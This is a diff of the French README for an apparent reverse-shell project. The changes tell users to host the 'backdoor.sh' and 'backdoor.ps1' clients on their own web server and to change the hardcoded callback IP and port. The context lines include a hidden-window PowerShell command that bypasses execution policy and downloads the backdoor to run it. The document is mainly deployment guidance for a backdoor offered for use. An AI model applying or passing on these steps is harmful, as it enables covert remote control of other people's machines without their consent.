@@ -44,6 +44,7 @@ PRUVOST-OMEGA-Reverse-Shell/
 ## 🚀 Installation & Exécution
 
 ### 🎯 Cible Linux
+# Il est conseillé de placer les scripts dans un serveur Web, Pour modifier la partie ```https://raw.githubusercontent.com/s-i-m-o-n-git/Reverse-Shell/refs/heads/main/backdoor.sh``` et ```https://raw.githubusercontent.com/s-i-m-o-n-git/Reverse-Shell/refs/heads/main/backdoor.ps1``` qui pointe vers l'ip '192.168.1.18' qui est donc une IP locale. Il faudra donc changer l'ip dans les 2 scripts, et utiliser votre propre script. 
 
 **Installation manuelle :**
 
@@ -95,7 +96,7 @@ powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebReque
 
 ## 📡 Communication
 
-* Le client (`backdoor.ps1` / `backdoor.sh`) tente de se connecter à `192.168.1.18:1337`
+* Le client (`backdoor.ps1` / `backdoor.sh`) tente de se connecter à `192.168.1.18:1337` ( A changer )
 * Le serveur ImGui écoute sur `INADDR_ANY:1337` et accepte plusieurs connexions, identifiées par IP
 
 > ⚠️ **Changez l'adresse IP hardcodée dans les scripts clients avant d'utiliser l'application.**
